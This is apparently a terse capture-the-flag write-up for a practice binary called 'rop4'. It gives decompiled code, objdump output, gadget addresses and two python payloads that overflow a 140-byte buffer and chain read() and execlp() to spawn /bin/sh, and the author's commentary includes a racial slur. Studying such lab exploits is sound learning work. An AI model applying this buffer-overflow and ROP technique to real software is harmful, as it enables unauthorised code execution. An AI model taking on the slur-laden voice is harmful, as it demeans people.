




function have gadget
```c
signed int exec_the_string()
{
  int v1; // [sp+Ch] [bp-Ch]@0

  return execlp((char *)&exec_string, (int)&exec_string, 0, v1);
}
```

````
objdump -d rop4| grep 'exec'
08048ed0 <exec_the_string>:
 8048eed:       e8 be ab 00 00          call   8053ab0 <execlp>
objdump -d rop4| grep 'read'
 8048f5d:       e8 be ad 00 00          call   8053d20 <__libc_read>
```
8053d20
0xfffdd000
read(1,0xfffdd000,9)	1 is stdout (file input)
```
python -c 'print "A"*140 + "\x20\x3d\x05\x08" + "JUNK" +"\x01\x00\x00\x00" + "\x00\xd0\xfd\xff"+ "\x09\x00\x00\x00"' | ./rop4
```

that will help us print out /bin/sh to our terminal !! really nigga!!
the gadget
```asm
0x8053ab0  execlp
0x809b675 <__mpn_mul_1+53>:  pop    ebp			<---- address of /bin/sh
0x809b676 <__mpn_mul_1+54>:  pop    esi			<---- address of /bin/sh
0x809b677 <__mpn_mul_1+55>:  pop    edi			<---- 0
0x809b678 <__mpn_mul_1+56>:  ret  
```
so we need to redirect to ropgadget to add the argument of execlp function
then the script 
```
python -c 'print "A"*140 + "\x20\x3d\x05\x08" + "\x75\xb6\x09\x08" +"\x01\x00\x00\x00" + "\x00\xd0\xfd\xff"+ "\x09\x00\x00\x00" + "\xb0\x3a\x05\x08" + "\x00\xd0\xfd\xff" + "\x00\xd0\xfd\xff" + "\x00\x00\x00\x00"' | ./rop4
```

